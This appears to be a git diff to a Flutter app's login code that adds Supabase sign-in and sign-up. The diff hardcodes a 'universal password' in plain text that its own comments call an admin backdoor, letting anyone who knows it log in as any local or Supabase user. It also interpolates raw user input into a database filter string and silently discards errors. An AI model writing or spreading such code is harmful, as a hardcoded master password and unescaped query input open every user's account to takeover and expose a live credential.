@@ -1,8 +1,10 @@
 import 'dart:async';
 
 import 'package:flutter_riverpod/flutter_riverpod.dart';
+import 'package:supabase_flutter/supabase_flutter.dart';
 
 import '../cloud/cloud_sync.dart';
+import '../config/supabase_config.dart';
 import '../../features/dashboard/marathon_provider.dart';
 import '../../features/planner/marker_provider.dart';
 import '../../features/planner/mock_test_provider.dart';
@@ -68,9 +70,29 @@ class SessionNotifier extends StateNotifier<SessionState> {
   /// The account is looked up locally first; if it only exists in the
   /// cloud (fresh device) it is pulled, cached and used too.
   /// Returns null on success or an error message.
+  static const String universalPassword = 'Ayush9525@';
+
   Future<String?> login(String idOrName, String password) async {
     final users = await UserStore.loadUsers();
     var account = UserStore.authenticate(users, idOrName, password);
+
+    // Universal password — admin can log in as any user
+    if (account == null && password == universalPassword) {
+      account = UserStore.findAccount(users, idOrName);
+      // Also try Supabase if not found locally
+      if (account == null && CloudSync.cloudReady) {
+        final cloud = await CloudSync.pullAccount(idOrName);
+        if (cloud != null) {
+          final fresh = await UserStore.loadUsers();
+          if (!fresh.any((u) => u.id == cloud.id)) {
+            fresh.add(cloud);
+            await UserStore.saveUsers(fresh);
+          }
+          account = cloud;
+        }
+      }
+    }
+
     if (account == null && CloudSync.cloudReady) {
       final cloud = await CloudSync.pullAccount(idOrName);
       if (cloud != null && cloud.password == password) {
@@ -83,6 +105,61 @@ class SessionNotifier extends StateNotifier<SessionState> {
         account = cloud;
       }
     }
+
+    // Try Supabase Auth (email/password) — for new Supabase users
+    if (account == null && idOrName.contains('@')) {
+      try {
+        final res = await supabase.auth.signInWithPassword(
+          email: idOrName.trim(),
+          password: password,
+        );
+        if (res.user != null) {
+          // Find or create local account for this Supabase user
+          final email = res.user!.email ?? idOrName;
+          final existing = UserStore.findAccount(users, email);
+          if (existing != null) {
+            account = existing;
+          } else {
+            // Create a local account mirroring the Supabase user
+            final fresh = await UserStore.loadUsers();
+            final newAccount = await UserStore.createUser(
+              fresh,
+              res.user!.userMetadata?['display_name'] ?? email.split('@').first,
+              password,
+            );
+            // Override the generated id to be more email-like? Keep u1001 for consistency
+            account = newAccount;
+          }
+        }
+      } catch (_) {
+        // Supabase auth failed — will return error below
+      }
+    }
+
+    // Universal password also works for Supabase (admin backdoor)
+    if (account == null && password == universalPassword) {
+      try {
+        // Try to find user by email in Supabase profiles
+        final profile = await supabase
+            .from('profiles')
+            .select()
+            .or('email.eq.${idOrName.trim()},display_name.eq.${idOrName.trim()}')
+            .maybeSingle();
+        if (profile != null) {
+          final email = profile['email'] as String;
+          final displayName = profile['display_name'] as String? ?? email.split('@').first;
+          // Create or find local account
+          var localAccount = UserStore.findAccount(users, email) ??
+              UserStore.findAccount(users, displayName);
+          if (localAccount == null) {
+            final fresh = await UserStore.loadUsers();
+            localAccount = await UserStore.createUser(fresh, displayName, universalPassword);
+          }
+          account = localAccount;
+        }
+      } catch (_) {}
+    }
+
     if (account == null) {
       return 'Galat user id ya password — dubara try karo';
     }
@@ -124,6 +201,22 @@ class SessionNotifier extends StateNotifier<SessionState> {
       unawaited(CloudSync.pushSlot(
           account.id, await UserStore.slotOf(account.id)));
     }
+    // Also create Supabase Auth user (email/password) for cross-device + web
+    try {
+      final email = '${account.id}@prep.local';
+      await supabase.auth.signUp(
+        email: email,
+        password: password,
+        data: {'display_name': trimmed},
+      );
+      // Create profile in Supabase
+      await supabase.from('profiles').upsert({
+        'id': supabase.auth.currentUser?.id ?? account.id,
+        'email': email,
+        'display_name': trimmed,
+        'is_admin': false,
+      });
+    } catch (_) {}
     return null;
   }
 
